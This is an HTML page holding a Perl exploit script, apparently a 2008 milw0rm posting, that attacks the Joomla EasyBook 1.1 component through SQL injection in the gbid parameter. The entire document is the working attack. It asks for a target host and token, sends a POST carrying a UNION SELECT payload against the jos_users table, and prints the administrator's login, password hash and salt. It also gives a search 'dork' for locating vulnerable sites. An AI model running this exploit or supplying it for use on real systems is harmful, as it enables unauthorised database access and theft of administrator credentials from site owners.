<html><head><title>Joomla Component EasyBook 1.1 (gbid) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
use IO::Socket;
use strict;

##### INFO##############################
# Example:                             #
# Host: xxx.lu  	               #
# &amp;md: 0f8ab366793a0d1da85c6f5a8d4fb576#
########################################


print &quot;-+--[ Joomla Component EasyBook 1.1 SQL Injection Exploit]--+-\n&quot;;
print &quot;-+--                                                      --+-\n&quot;;
print &quot;-+--            Author: ZAMUT                             --+-\n&quot;;
print &quot;-+--            Vuln: gbid=                               --+-\n&quot;;
print &quot;-+--            Homepage: http://antichat.ru              --+-\n&quot;;
print &quot;-+--            Dork: com_easybook                        --+-\n\n&quot;;

print &quot;Host:&quot; ;
chomp(my $host=&lt;STDIN&gt;);
print &quot;&amp;md=&quot;;
chomp(my $md=&lt;STDIN&gt;);

my ($socket,$lhs,$l,$h,$s);
$socket = IO::Socket::INET-&gt;new(&quot;$host:80&quot;) || die(&quot;Can't connecting!&quot;);
print $socket  &quot;POST /index.php HTTP/1.0\n&quot;.
               &quot;Host: www.$host\n&quot;.
			   &quot;Content-Type: application/x-www-form-urlencoded\n&quot;.
			   &quot;Content-Length: 214\n\n&quot;.
               &quot;option=com_easybook&amp;Itemid=1&amp;func=deleteentry&amp;gbid=-1+union+select+1,2,concat(0x3A3A3A,username,0x3a,password,0x3A3A3A),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+jos_users/*&amp;md=$md\n&quot;;
  while(&lt;$socket&gt;)
  {
	 $s = &lt;$socket&gt;;
	 if($s=~/:::(.+):::/){
		   $lhs = $1;
	       ($l,$h,$s)=split(':',$lhs);
		   print &quot;\nAdmin Login:$l\nHash:$h\nSalt:$s\n&quot;;
		   close $socket; 
		   exit; }
  }
  die (&quot;Exploit failed!&quot;);

# milw0rm.com [2008-06-04]</pre></html>